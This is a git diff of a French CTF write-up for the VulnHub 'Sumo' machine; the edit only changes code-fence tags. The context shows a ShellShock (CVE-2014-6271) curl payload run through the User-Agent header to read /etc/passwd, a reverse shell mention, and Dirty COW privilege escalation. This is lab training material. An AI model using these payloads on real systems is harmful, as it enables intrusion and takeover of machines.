@@ -8,7 +8,7 @@ One way or another
 
 Voici un writeup pour [Sumo](https://www.vulnhub.com/entry/sumo-1,480/), petit CTF créé par *SunCSR Team*.  
 
-```plain
+```
 Not shown: 65533 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
@@ -25,13 +25,13 @@ On a un serveur web et un serveur SSH. Comme vous le verrez on pourra même se p
 
 Je lance Nuclei sur le serveur web qui me trouve direct une vulnérabilité :  
 
-```plain
+```
 [2021-12-27 11:56:38] [CVE-2014-6271] [http] [critical] http://192.168.56.15/cgi-bin/test
 ```
 
 Il s'agit de la faille ShellShock. Wapiti est en mesure de confirmer la vulnérabilité :  
 
-```plain
+```
 $ ./bin/wapiti -u http://192.168.56.15/cgi-bin/test --scope url -m shellshock
 ujson module not found, using json
 msgpack not installed, MsgPackSerializer unavailable
@@ -55,7 +55,7 @@ I'm gonna find ya
 
 On peut exploiter la vulnérabilité directement avec cURL :  
 
-```plain
+```
 $ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://192.168.56.15/cgi-bin/test
 
 root:x:0:0:root:/root:/bin/bash
@@ -87,7 +87,7 @@ J'ai profite donc pour obtenir un shell via *ReverseSSH*.
 
 L'utilisateur *sumo* est intéressant car fait partie de groupes privilégiés :  
 
-```plain
+```
 uid=1000(sumo) gid=1000(sumo) groups=1000(sumo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),109(sambashare)
 ```
 
@@ -100,7 +100,7 @@ La machine est vulnérable à différents exploits Kernel dont [Dirty COW](https
 
 L'exploit signé Firefart donne généralement des bons résultats donc je ne suis pas allé chercher ailleurs.  
 
-```plain
+```
 www-data@ubuntu:/tmp$ ./dirty holyc0w
 /etc/passwd successfully backed up to /tmp/passwd.bak
 Please enter the new password: holyc0w
